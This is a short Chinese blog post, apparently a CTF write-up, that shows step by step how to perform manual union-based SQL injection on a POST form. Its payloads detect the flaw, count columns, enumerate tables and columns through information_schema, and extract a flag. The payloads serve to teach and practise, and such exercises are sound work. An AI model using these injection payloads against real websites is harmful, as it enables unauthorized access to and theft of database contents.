---
title: CTF SQLI
toc: true
date: 2021-04-25 17:12:07
tags: CTF
categories: [100 Cyber security, 120 CTF, 121 Web ]
---

### 手注流程

1. 页面里有一个POST表单，测试会不会有注入漏洞
    POST里
    id=1'和id=1'#
    id=1' and 1=2#和id=1' and 1=1#
    前一个不回显后一个回显，那么说明存在注入。
1. 判断字段数：有四个字段
    id=1' order by 4#
1. 判断回显位：
    id=1' union select 1,2,3,4# 有正常回显
    id=1' union select 1,2,3# 无回显，证明该数据库在第四位，查询该数据库名

1. id=0' union select 1,2,3,database()# 查到表名为skctf，继续查数据表（tables）名
1. id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf'#
1. id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'#
1. 查询数据：
    id=0' union select 1,2,3,skctf_flag from fl4g#
    得到flag。
